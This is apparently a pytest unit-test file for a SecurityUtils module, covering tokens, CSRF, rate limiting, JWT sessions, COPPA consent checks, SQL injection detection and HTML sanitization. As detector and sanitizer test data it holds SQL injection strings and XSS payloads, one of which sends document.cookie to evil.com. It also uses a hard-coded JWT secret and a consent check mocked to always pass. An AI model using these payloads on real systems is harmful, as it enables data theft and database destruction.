"""
Comprehensive unit tests for security_utils module.
Production-grade security testing for authentication, authorization, and protection.
"""

import pytest
import jwt
import json
from datetime import datetime, timedelta
from unittest.mock import patch

from src.utils.security_utils import SecurityUtils

# Note: TokenManager testing moved to infrastructure tests


class TestSecurityUtils:
    """Test SecurityUtils class functionality."""

    @pytest.fixture
    def security_utils(self):
        """Create SecurityUtils instance for testing."""
        return SecurityUtils()

    @pytest.fixture
    def security_utils_custom(self):
        """Create SecurityUtils with custom settings."""
        return SecurityUtils(
            token_expiry_hours=12,
            max_login_attempts=5,
            lockout_duration_minutes=60,
            coppa_mode=False,
        )

    @pytest.fixture
    def coppa_enabled_utils(self):
        """Create SecurityUtils with COPPA enabled."""
        return SecurityUtils(coppa_mode=True)

    def test_init_default_parameters(self):
        """Test SecurityUtils initialization with default parameters."""
        utils = SecurityUtils()
        assert utils.token_expiry_hours == 24
        assert utils.max_login_attempts == 3
        assert utils.lockout_duration_minutes == 30
        assert utils.coppa_mode is True

    def test_init_custom_parameters(self):
        """Test SecurityUtils initialization with custom parameters."""
        utils = SecurityUtils(
            token_expiry_hours=12,
            max_login_attempts=5,
            lockout_duration_minutes=60,
            coppa_mode=False,
        )
        assert utils.token_expiry_hours == 12
        assert utils.max_login_attempts == 5
        assert utils.lockout_duration_minutes == 60
        assert utils.coppa_mode is False

    def test_generate_secure_token_default_length(self, security_utils):
        """Test secure token generation with default length."""
        token = security_utils.generate_secure_token()

        assert isinstance(token, str)
        assert len(token) == 64  # 32 bytes * 2 (hex encoding)

        # Ensure randomness - two calls should produce different tokens
        token2 = security_utils.generate_secure_token()
        assert token != token2

    def test_generate_secure_token_custom_length(self, security_utils):
        """Test secure token generation with custom length."""
        for length in [16, 24, 32, 64]:
            token = security_utils.generate_secure_token(length)
            assert isinstance(token, str)
            assert len(token) == length * 2  # hex encoding doubles length

    def test_generate_csrf_token(self, security_utils):
        """Test CSRF token generation."""
        session_id = "test_session_123"
        token = security_utils.generate_csrf_token(session_id)

        assert isinstance(token, str)
        assert len(token) == 64  # SHA256 hex digest length

        # Same session should produce same token (within same second)
        token2 = security_utils.generate_csrf_token(session_id)
        assert token == token2

    @patch("src.utils.security_utils.datetime", autospec=True)
    def test_validate_csrf_token_valid(self, mock_datetime, security_utils):
        """Test CSRF token validation with valid token."""
        # Fix the timestamp to ensure consistent token generation/validation
        fixed_time = datetime(2023, 1, 1, 12, 0, 0)
        mock_datetime.utcnow.return_value = fixed_time

        session_id = "test_session_456"
        token = security_utils.generate_csrf_token(session_id)

        assert security_utils.validate_csrf_token(token, session_id) is True

    def test_validate_csrf_token_invalid(self, security_utils):
        """Test CSRF token validation with invalid token."""
        session_id = "test_session_789"
        invalid_token = "invalid_token_123"

        assert security_utils.validate_csrf_token(invalid_token, session_id) is False

    def test_validate_csrf_token_wrong_session(self, security_utils):
        """Test CSRF token validation with wrong session ID."""
        session_id1 = "session_1"
        session_id2 = "session_2"

        token = security_utils.generate_csrf_token(session_id1)
        assert security_utils.validate_csrf_token(token, session_id2) is False

    def test_check_rate_limit_allowed(self, security_utils):
        """Test rate limiting when requests are allowed."""
        client_id = "client_123"
        result = security_utils.check_rate_limit(client_id, limit=100, window=3600)

        assert result["allowed"] is True
        assert result["remaining"] == 99  # Mock implementation shows 1 request
        assert result["limit"] == 100
        assert isinstance(result["reset_time"], datetime)

    def test_check_rate_limit_custom_limits(self, security_utils):
        """Test rate limiting with custom limits."""
        client_id = "client_456"
        result = security_utils.check_rate_limit(client_id, limit=50, window=1800)

        assert result["limit"] == 50
        assert result["remaining"] == 49

    def test_validate_ip_address_valid_ipv4(self, security_utils):
        """Test IP address validation with valid IPv4 addresses."""
        valid_ips = [
            "192.168.1.1",
            "127.0.0.1",
            "8.8.8.8",
            "255.255.255.255",
            "0.0.0.0",
        ]

        for ip in valid_ips:
            assert security_utils.validate_ip_address(ip) is True

    def test_validate_ip_address_valid_ipv6(self, security_utils):
        """Test IP address validation with valid IPv6 addresses."""
        valid_ips = ["::1", "2001:db8::1", "fe80::1", "::ffff:192.168.1.1"]

        for ip in valid_ips:
            assert security_utils.validate_ip_address(ip) is True

    def test_validate_ip_address_invalid(self, security_utils):
        """Test IP address validation with invalid addresses."""
        invalid_ips = [
            "999.999.999.999",
            "192.168.1",
            "not.an.ip.address",
            "",
            "192.168.1.1.1",
            "hello world",
        ]

        for ip in invalid_ips:
            assert security_utils.validate_ip_address(ip) is False

    def test_parse_user_agent_default(self, security_utils):
        """Test user agent parsing with default mock implementation."""
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0"
        result = security_utils.parse_user_agent(user_agent)

        expected_fields = [
            "browser",
            "os",
            "device",
            "is_mobile",
            "is_tablet",
            "is_pc",
            "is_bot",
        ]
        for field in expected_fields:
            assert field in result

        # Mock implementation defaults
        assert result["browser"] == "Unknown"
        assert result["os"] == "Unknown"
        assert result["is_pc"] is True
        assert result["is_bot"] is False

    def test_detect_sql_injection_clean_input(self, security_utils):
        """Test SQL injection detection with clean input."""
        clean_inputs = [
            "Hello world",
            "user@example.com",
            "This is normal text",
            "123456",
            "",
        ]

        for input_text in clean_inputs:
            assert security_utils.detect_sql_injection(input_text) is False

    def test_detect_sql_injection_malicious_input(self, security_utils):
        """Test SQL injection detection with malicious input."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users",
            "'; DELETE FROM accounts; --",
            "'; INSERT INTO admin VALUES ('hacker'); --",
            "'; UPDATE users SET admin=1; --",
            "' AND '1'='1",
        ]

        for input_text in malicious_inputs:
            assert security_utils.detect_sql_injection(input_text) is True

    def test_detect_sql_injection_case_insensitive(self, security_utils):
        """Test SQL injection detection is case insensitive."""
        case_variants = ["' or '1'='1", "' OR '1'='1", "' Or '1'='1", "' oR '1'='1"]

        for input_text in case_variants:
            assert security_utils.detect_sql_injection(input_text) is True

    def test_sanitize_html_clean_input(self, security_utils):
        """Test HTML sanitization with clean input."""
        clean_html = "<p>This is a clean paragraph.</p>"
        result = security_utils.sanitize_html(clean_html)
        assert result == clean_html

    def test_sanitize_html_remove_scripts(self, security_utils):
        """Test HTML sanitization removes script tags."""
        malicious_html = "<p>Hello</p><script>alert('xss')</script><p>World</p>"
        result = security_utils.sanitize_html(malicious_html)

        assert "<script>" not in result
        assert "alert('xss')" not in result
        assert "<p>Hello</p>" in result
        assert "<p>World</p>" in result

    def test_sanitize_html_remove_javascript_protocols(self, security_utils):
        """Test HTML sanitization removes javascript: protocols."""
        malicious_html = '<a href="javascript:alert(1)">Click me</a>'
        result = security_utils.sanitize_html(malicious_html)

        assert "javascript:" not in result

    def test_sanitize_html_remove_event_handlers(self, security_utils):
        """Test HTML sanitization removes event handlers."""
        malicious_html = '<div onclick="alert(1)" onmouseover="hack()">Content</div>'
        result = security_utils.sanitize_html(malicious_html)

        assert "onclick=" not in result
        assert "onmouseover=" not in result

    def test_sanitize_html_remove_dangerous_tags(self, security_utils):
        """Test HTML sanitization removes dangerous tags."""
        dangerous_html = """
        <iframe src="evil.com"></iframe>
        <object data="malware.swf"></object>
        <embed src="virus.swf"></embed>
        <form action="phishing.com"><input type="password"></form>
        """
        result = security_utils.sanitize_html(dangerous_html)

        assert "<iframe" not in result
        assert "<object" not in result
        assert "<embed" not in result
        assert "<form" not in result
        assert "<input" not in result

    def test_sanitize_html_empty_input(self, security_utils):
        """Test HTML sanitization with empty input."""
        assert security_utils.sanitize_html("") == ""
        assert security_utils.sanitize_html(None) == ""

    @patch("src.utils.security_utils.datetime", autospec=True)
    def test_create_session(self, mock_datetime, security_utils):
        """Test session creation."""
        fixed_time = datetime(2023, 1, 1, 12, 0, 0)
        mock_datetime.utcnow.return_value = fixed_time

        user_data = {
            "user_id": "user_123",
            "email": "user@example.com",
            "role": "parent",
        }

        session_token = security_utils.create_session(user_data)

        assert isinstance(session_token, str)
        # Should be a valid JWT token
        try:
            # Decode without verification to check structure
            decoded = jwt.decode(session_token, options={"verify_signature": False})
            assert decoded["user_id"] == "user_123"
            assert decoded["email"] == "user@example.com"
            assert decoded["role"] == "parent"
        except jwt.InvalidTokenError:
            pytest.fail("Generated token is not a valid JWT")

    def test_validate_session_valid_token(self, security_utils):
        """Test session validation with valid token."""
        user_data = {
            "user_id": "user_456",
            "email": "test@example.com",
            "role": "admin",
        }

        session_token = security_utils.create_session(user_data)
        result = security_utils.validate_session(session_token)

        assert result["valid"] is True
        assert result["user_id"] == "user_456"
        assert result["email"] == "test@example.com"
        assert result["role"] == "admin"
        assert isinstance(result["expires_at"], datetime)

    def test_validate_session_invalid_token(self, security_utils):
        """Test session validation with invalid token."""
        invalid_token = "invalid.jwt.token"
        result = security_utils.validate_session(invalid_token)

        assert result["valid"] is False
        assert "error" in result

    def test_validate_session_expired_token(self, security_utils):
        """Test session validation with expired token."""
        # Create a token that's already expired
        expired_payload = {
            "user_id": "user_789",
            "exp": datetime.utcnow() - timedelta(hours=1),  # Expired 1 hour ago
        }
        expired_token = jwt.encode(
            expired_payload, "your-secret-key-here", algorithm="HS256"
        )

        result = security_utils.validate_session(expired_token)

        assert result["valid"] is False
        assert result["error"] == "Token expired"

    def test_validate_child_data_access_coppa_disabled(self, security_utils_custom):
        """Test child data access validation with COPPA disabled."""
        access_request = {
            "parent_id": "parent_123",
            "child_id": "child_456",
            "requested_data": ["name", "age"],
        }

        result = security_utils_custom.validate_child_data_access(access_request)

        assert result["authorized"] is True
        assert result["coppa_compliant"] is False

    def test_validate_child_data_access_coppa_enabled(self, coppa_enabled_utils):
        """Test child data access validation with COPPA enabled."""
        access_request = {
            "parent_id": "parent_123",
            "child_id": "child_456",
            "requested_data": ["name", "age"],
        }

        # Mock implementation always returns True for consent
        result = coppa_enabled_utils.validate_child_data_access(access_request)

        assert result["authorized"] is True
        assert result["coppa_compliant"] is True
        assert result["consent_verified"] is True

    @patch("src.utils.security_utils.logger", autospec=True)
    def test_log_security_event(self, mock_logger, security_utils):
        """Test security event logging."""
        event_type = "sql_injection"
        details = {
            "ip_address": "192.168.1.100",
            "user_agent": "Malicious Bot",
            "payload": "'; DROP TABLE users; --",
        }

        security_utils.log_security_event(event_type, details)

        # Verify logger was called
        mock_logger.error.assert_called_once()

        # Check log entry structure
        log_call = mock_logger.error.call_args[0][0]
        assert "SECURITY EVENT:" in log_call

        # Parse the JSON log entry
        log_json = log_call.replace("SECURITY EVENT: ", "")
        log_data = json.loads(log_json)

        assert log_data["event_type"] == event_type
        assert log_data["details"] == details
        assert log_data["severity"] == "high"
        assert "timestamp" in log_data

    def test_get_event_severity_high(self, security_utils):
        """Test event severity classification for high severity events."""
        high_severity_events = [
            "sql_injection",
            "xss_attempt",
            "brute_force",
            "unauthorized_access",
        ]

        for event_type in high_severity_events:
            severity = security_utils._get_event_severity(event_type)
            assert severity == "high"

    def test_get_event_severity_medium(self, security_utils):
        """Test event severity classification for medium severity events."""
        medium_severity_events = ["rate_limit_exceeded", "suspicious_activity"]

        for event_type in medium_severity_events:
            severity = security_utils._get_event_severity(event_type)
            assert severity == "medium"

    def test_get_event_severity_low(self, security_utils):
        """Test event severity classification for low severity events."""
        low_severity_events = ["normal_login", "password_change", "unknown_event"]

        for event_type in low_severity_events:
            severity = security_utils._get_event_severity(event_type)
            assert severity == "low"

    def test_verify_parental_consent_mock(self, security_utils):
        """Test parental consent verification (mock implementation)."""
        # Mock implementation always returns True
        result = security_utils._verify_parental_consent(
            "parent_123", "child_456", ["name", "age"]
        )
        assert result is True


# Note: TokenManager moved to src.infrastructure.security.auth
# For TokenManager testing, see tests/infrastructure/security/


class TestSecurityUtilsEdgeCases:
    """Test edge cases and error conditions."""

    @pytest.fixture
    def security_utils(self):
        return SecurityUtils()

    def test_detect_sql_injection_empty_input(self, security_utils):
        """Test SQL injection detection with empty input."""
        assert security_utils.detect_sql_injection("") is False
        assert security_utils.detect_sql_injection(None) is False

    def test_csrf_token_time_sensitivity(self, security_utils):
        """Test CSRF token generation is time-sensitive."""
        session_id = "time_test_session"

        with patch("src.utils.security_utils.datetime", autospec=True) as mock_datetime:
            # First timestamp
            mock_datetime.utcnow.return_value.isoformat.return_value = (
                "2023-01-01T12:00:00"
            )
            token1 = security_utils.generate_csrf_token(session_id)

            # Different timestamp
            mock_datetime.utcnow.return_value.isoformat.return_value = (
                "2023-01-01T12:00:01"
            )
            token2 = security_utils.generate_csrf_token(session_id)

            # Tokens should be different due to timestamp difference
            assert token1 != token2

    def test_sanitize_html_complex_nested_attacks(self, security_utils):
        """Test HTML sanitization with complex nested attacks."""
        complex_attack = """
        <div>
            <script>
                var img = new Image();
                img.src = "http://evil.com/steal?data=" + document.cookie;
            </script>
            <iframe src="javascript:alert('xss')" style="display:none"></iframe>
            <img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
        </div>
        """

        result = security_utils.sanitize_html(complex_attack)

        # Should remove all dangerous elements
        assert "<script>" not in result
        assert "<iframe>" not in result
        assert "javascript:" not in result
        assert "onerror=" not in result
        assert "eval(" not in result

    def test_rate_limit_reset_time_calculation(self, security_utils):
        """Test rate limit reset time calculation."""
        client_id = "test_client"
        window_seconds = 1800  # 30 minutes

        with patch("src.utils.security_utils.datetime", autospec=True) as mock_datetime:
            fixed_time = datetime(2023, 1, 1, 12, 0, 0)
            mock_datetime.utcnow.return_value = fixed_time

            result = security_utils.check_rate_limit(client_id, window=window_seconds)

            expected_reset = fixed_time + timedelta(seconds=window_seconds)
            assert result["reset_time"] == expected_reset


class TestSecurityIntegration:
    """Integration tests for security workflows."""

    def test_complete_authentication_workflow(self):
        """Test complete authentication workflow using SecurityUtils only."""
        # Note: TokenManager functionality moved to infrastructure auth
        security_utils = SecurityUtils()

        # Step 1: Create user session
        user_data = {
            "user_id": "integration_user",
            "email": "user@example.com",
            "role": "parent",
        }

        session_token = security_utils.create_session(user_data)
        assert session_token is not None

        # Step 2: Validate session
        session_validation = security_utils.validate_session(session_token)
        assert session_validation["valid"] is True
        assert session_validation["user_id"] == "integration_user"

        # Note: Token permission testing moved to infrastructure auth tests
        # Step 3: Validate COPPA compliance for child data access
        access_request = {
            "parent_id": "integration_user",
            "child_id": "child123",
            "requested_data": ["name", "age"],
        }

        access_result = security_utils.validate_child_data_access(access_request)
        assert access_result["authorized"] is True

    def test_security_threat_detection_workflow(self):
        """Test security threat detection workflow."""
        security_utils = SecurityUtils()

        # Simulate various security threats
        threats = [
            {
                "type": "sql_injection",
                "input": "'; DROP TABLE users; --",
                "detector": security_utils.detect_sql_injection,
            },
            {
                "type": "xss_attempt",
                "input": "<script>alert('xss')</script>",
                "detector": lambda x: "<script>" in x,
            },
            {
                "type": "invalid_ip",
                "input": "999.999.999.999",
                "detector": lambda x: not security_utils.validate_ip_address(x),
            },
        ]

        detected_threats = []

        for threat in threats:
            if threat["detector"](threat["input"]):
                detected_threats.append(threat["type"])

                # Log security event
                with patch(
                    "src.utils.security_utils.logger", autospec=True
                ) as mock_logger:
                    security_utils.log_security_event(
                        threat["type"], {"malicious_input": threat["input"]}
                    )
                    mock_logger.error.assert_called_once()

        # Should detect all threats
        assert "sql_injection" in detected_threats
        assert "xss_attempt" in detected_threats
        assert "invalid_ip" in detected_threats

    def test_coppa_compliance_workflow(self):
        """Test COPPA compliance validation workflow."""
        coppa_utils = SecurityUtils(coppa_mode=True)

        # Test various access scenarios
        access_scenarios = [
            {
                "request": {
                    "parent_id": "parent_123",
                    "child_id": "child_456",
                    "requested_data": ["name", "age", "preferences"],
                },
                "description": "Full data access request",
            },
            {
                "request": {
                    "parent_id": None,
                    "child_id": "child_789",
                    "requested_data": ["chat_history"],
                },
                "description": "Access without parent ID",
            },
        ]

        for scenario in access_scenarios:
            result = coppa_utils.validate_child_data_access(scenario["request"])

            # All should be authorized due to mock implementation
            # but should maintain COPPA compliance
            assert result["coppa_compliant"] is True

            if scenario["request"].get("parent_id"):
                assert result["authorized"] is True
                assert result.get("consent_verified") is True
            else:
                # Mock always returns True, but real implementation would check consent
                assert "coppa_compliant" in result
